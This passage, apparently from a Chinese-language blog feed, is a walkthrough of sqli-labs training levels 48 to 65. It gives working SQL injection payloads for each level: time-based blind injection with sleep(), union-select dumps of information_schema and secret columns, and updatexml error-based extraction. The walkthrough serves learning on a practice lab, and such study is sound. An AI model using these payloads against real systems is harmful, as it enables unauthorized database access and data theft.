limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第49关<br>与第48关相比差不多，只是闭合方式为’</p></li><li><p>第50关<br>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p></li><li><p>第51关<br>与第50关相比差不多，只是闭合方式为’</p></li><li><p>第52关<br>与第50关相比差不多</p></li><li><p>第53关<br>与第51关相比差不多</p></li></ul><h2 id="54-57-完结训练"><a href="#54-57-完结训练" class="headerlink" title="54-57(完结训练)"></a>54-57(完结训练)</h2><ol><li><p>测试并判断注入类型<br>就像回到了开始~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1  显示正常</span><br><span class="line">?id=1&#x27;  无错误信息，但显示不正常</span><br></pre></td></tr></table></figure><p>推测闭合方式为’</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 4 --+  无错误信息，但显示不正常</span><br><span class="line">?id=1&#x27;order by 3 --+  显示正常</span><br></pre></td></tr></table></figure><p>字段数为3</p></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenages&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;8k8nkr7hq5&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(secret_2GAF),3 from 8k8nkr7hq5 --+</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第55关<br>与第54关差不多，闭合方式变更为)</p></li><li><p>第56关<br>与第54关差不多，闭合方式变更为’)</p></li><li><p>第57关<br>与第54关差不多，闭合方式变更为”</p></li></ul><h2 id="58-65-完结训练"><a href="#58-65-完结训练" class="headerlink" title="58-65(完结训练)"></a>58-65(完结训练)</h2><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  显示报错信息</span><br></pre></td></tr></table></figure><p>由此闭合方式为’<br>因为只有5次机会，所以我们采用报错注入比较快</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;6ykqspiws7&#x27; limit 2,1),0x7e),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select secret_K2GB from 6ykqspiws7),0x7e),1) --+</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第59关<br>与第58关相比差不多，只是闭合方式没有单引号</p></li><li><p>第60关<br>与第58关相比差不多，只是闭合方式为id&#x3D;-1”)</p></li><li><p>第61关<br>与第58关相比差不多，只是闭合方式为id&#x3D;-1’))</p></li><li><p>第62关<br>时间盲注，闭合方式’)</p></li><li><p>第63关<br>时间盲注，闭合方式’</p></li><li><p>第64关<br>时间盲注，闭合方式))</p></li><li><p>第65关<br>时间盲注，闭合方式”)</p></li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>sqli-labs只是SQL注入的开始。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本次为sqli-labs的合集，为了方便。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
</feed>
